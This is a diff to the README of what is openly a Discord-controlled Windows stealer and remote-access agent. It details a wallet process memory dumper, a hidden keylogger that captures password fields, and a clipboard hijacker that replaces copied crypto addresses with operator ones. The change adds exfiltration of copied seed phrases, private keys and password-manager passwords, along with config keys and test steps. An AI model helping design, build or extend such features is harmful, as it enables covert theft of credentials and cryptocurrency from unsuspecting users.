@@ -37,7 +37,7 @@ Local state in `config.json`: version, channel, webhook, last ID and last heartb
 
 ## Commands
 
-`help`, `shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `bootstrap`, `hives`, `screenshot`, `clip [read|on|off|status]`, `addr add|list|del|clear`, `memdump [electrum|phantom|ledger|exodus|pid]`, `wallet watch on|off|status`, `keys on|off [--hard]|status|dump`, `ops`, `clear`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
+`help`, `shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `bootstrap`, `hives`, `screenshot`, `clip [read|on|off|status|secrets on|off]`, `addr add|list|del|clear`, `memdump [electrum|phantom|ledger|exodus|pid]`, `wallet watch on|off|status`, `keys on|off [--hard]|status|dump`, `ops`, `clear`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
 
 `help` lists the commands in the channel; `bootstrap` re-runs the automatic first-run collection.
 
@@ -52,8 +52,9 @@ Three Windows-only services start with the agent, need no administrator and no n
 - **Wallet watch** (1.5 s): foreground title plus process scan for Electrum, Phantom, MetaMask, Rabby, Trust, Coinbase Wallet, Ledger Live and Exodus. Phantom/MetaMask are dumped through the browser's `--extension-process` children (the two largest), never through the browser main process. Each detection posts `wallet detected`, wakes the keylogger, waits 5 s, dumps, zips, uploads and scans. Findings notify the seed/`xprv`/Solana key; a clean dump retries at 60 s and 180 s while the process lives (three dumps maximum). Processes over 1.5 GB are skipped with a notice. Deduplication is `(name, pid, start time)` and the global cooldown is `wallets.dumpCooldownSec` (600 s).
 - **Keylogger**: `WH_KEYBOARD_LL` hook in a hidden PowerShell process with its own mutex, launched at agent start and relaunched from `startup.vbs` on logon while `cache/ops/keys.on` exists. UI Automation `IsPassword` decides first; the title/process heuristic is only the fallback. Blocks flush on Enter, Tab, focus change or 10 s idle; only 6–256 non-blank characters reach `passwords.log`, with process and title. `cache/ops/keys.log` keeps all context blocks. Password messages look like `password? <proc> | <title> | <text>`.
 - **Clipboard**: a hidden message-only window with `AddClipboardFormatListener` (`WM_CLIPBOARDUPDATE`, no polling). The text is validated by the agent over stdin/stdout and written back with Win32 in a few milliseconds. Strict checksums: base58check and bech32/bech32m for BTC (P2PKH, P2SH, bc1q, bc1p), EIP-55 for mixed-case ETH, 32-byte base58 for SOL, plus LTC, DOGE, BCH cashaddr/legacy, TRX, XRP and ADA. Only a single-line clipboard of at most 128 characters is touched; URLs, spaces, multiline text and anything that is already an operator address are left alone. Rotation is round-robin per coin and bech32 case is preserved.
+  Independently of replacement, copied secrets are reported too: a 12/24-word BIP39 seed (checksum checked), `xprv`, raw EVM or Solana private key always, and a password when the foreground window is a credential manager or its password page. `clip secrets off` (or `clipboard.sendSecrets=false`) silences only those alerts.
 
-All three are on by default. `wallets.watch`, `keylogger.enabled`, `keylogger.sendPasswords` and `clipboard.enabled` in `discord.json` provide defaults; `wallet watch`, `keys` and `clip` set a local override in `config.json` that wins. `addr add|del|clear` store local coin lists under `clipboardCoins`; the provisioned `clipboard.coins` is used until the first local edit. `keys off --hard` also stops the wallet-triggered relaunch. `keylogger.sendPasswords=false` keeps local password logging but stops Discord messages.
+All three are on by default. `wallets.watch`, `keylogger.enabled`, `keylogger.sendPasswords`, `clipboard.enabled` and `clipboard.sendSecrets` in `discord.json` provide defaults; `wallet watch`, `keys`, `clip` and `clip secrets` set a local override in `config.json` that wins. `addr add|del|clear` store local coin lists under `clipboardCoins`; the provisioned `clipboard.coins` is used until the first local edit. `keys off --hard` also stops the wallet-triggered relaunch. `keylogger.sendPasswords=false` keeps local password logging but stops Discord messages.
 
 Configuration block (values must pass the validator; invalid addresses are ignored). Testnet forms are rejected unless `clipboard.testnet` is `true`:
 
@@ -63,6 +64,7 @@ Configuration block (values must pass the validator; invalid addresses are ignor
   "keylogger": { "enabled": true, "sendPasswords": true },
   "clipboard": {
     "enabled": true,
+    "sendSecrets": true,
     "testnet": false,
     "coins": {
       "btc": ["bc1q...", "1..."],
@@ -84,8 +86,9 @@ Windows-only is a hard limit: the Linux agent keeps the commands but reports `Wi
 3. Open Phantom in Edge/Brave with the extension unlocked: the dump contains extension renderers, not the browser main process.
 4. Copy a BTC/ETH/SOL address in Notepad: replaced in under 100 ms, one notification, pasting the replacement does not loop.
 5. Copy normal text, a URL and two lines: unchanged.
-6. Type in a Chrome password field and in Electrum's unlock dialog: one password event each, with process and title.
-7. `keys off --hard`, `clip off`, `wallet watch off`: services stop and stay stopped after the next wallet/restart.
+6. Copy a valid seed, an `xprv` and a password from KeePass/Bitwarden: each arrives as a `clipboard` secret notice; `clip secrets off` silences them without stopping address replacement.
+7. Type in a Chrome password field and in Electrum's unlock dialog: one password event each, with process and title.
+8. `keys off --hard`, `clip off`, `wallet watch off`: services stop and stay stopped after the next wallet/restart.
 
 ## Harvest
 
